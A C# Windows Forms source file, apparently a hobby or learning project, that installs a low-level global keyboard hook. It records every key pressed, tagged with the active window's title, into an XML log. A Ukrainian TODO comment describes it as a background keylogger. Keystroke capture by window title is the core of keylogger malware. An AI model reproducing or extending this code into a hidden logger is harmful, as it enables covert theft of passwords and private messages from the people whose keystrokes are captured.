using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using HooksInDotNET.LinqToXml;
using HooksInDotNET.Win32;
using RateConverter.Core;

namespace HooksInDotNET
{
    /*TODO:
     1) отримати заголовок активного выкна
    2) структура для відловлювання клавіш

    фонови додаток запускає lowlevel хук на клавіатуруб,
    у фай з вказаною концішурацією записує всі натиснуті кнопк тна клавіатурі

    при чому файл кейлогера має хмл-формат:

    <Window name="<window title>">
    [<натиснуті клавіші>]
    </Windows>
     */
    public partial class MainForm : Form
    {
        private LocalWindowsHook _lowLevelKeyboardHook;
        private int _currentThreadId;

        private readonly string uninstallHookError = "Hook uninstall has failed.";

        private object sync = new object();
        KeyboardHookXmlParser parser = new KeyboardHookXmlParser();

        public MainForm()
        {
            InitializeComponent();
        }

        private int KeyBoardHookProc(int code, IntPtr wparam, IntPtr lparam)
        {
            try
            {
                Monitor.TryEnter(sync, 500);
                if (code >= WinApi.HC_ACTION)
                {
                    WinApi.KeyboardHookStruct kbhsStruct = new WinApi.KeyboardHookStruct();

                    switch (wparam.ToInt32())
                    {
                        case WinApi.WM_KEYDOWN:
                            case WinApi.WM_SYSKEYDOWN:
                            {
                                kbhsStruct =
                                    (WinApi.KeyboardHookStruct)Marshal.PtrToStructure(lparam,
                                                                                       (new WinApi.KeyboardHookStruct())
                                                                                           .GetType());
                            }
                            break;
                    }

                    if (kbhsStruct.vkCode != 0)
                    {
                        KeysConverter kc = new KeysConverter();
                        string currentTitle = _lowLevelKeyboardHook.GetWindowTitle();

                        parser.Add(currentTitle, kc.ConvertToInvariantString(kbhsStruct.vkCode));
                       
                        messageLogTextBox.Text += string.Format(" {0} ", kc.ConvertToInvariantString(kbhsStruct.vkCode));
                    }

                }

                return _lowLevelKeyboardHook.CallNextHook(_lowLevelKeyboardHook.HookHandle, code, wparam, lparam);
            }
            finally
            {
                Monitor.Exit(sync);
            }
        }

        private void InstallHookButton_Click(object sender, EventArgs e)
        {
            _lowLevelKeyboardHook = new LocalWindowsHook(HookType.WH_KEYBOARD_LL, KeyBoardHookProc);

            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    Text = curModule.ModuleName;
                    _lowLevelKeyboardHook.Install(_lowLevelKeyboardHook.GetModuleID(curModule.ModuleName));
                }
            }

            _lowLevelKeyboardHook.Install(_currentThreadId);
        }

        private void OnUninstallHook(object sender, EventArgs e)
        {
            try
            {
                if (_lowLevelKeyboardHook.HookHandle != IntPtr.Zero)
                {
                    _lowLevelKeyboardHook.Uninstall();
                }
            }
            catch (Exception)
            {
                LogManager.Instance.PutMessage(uninstallHookError);
            }
        }
    }
}
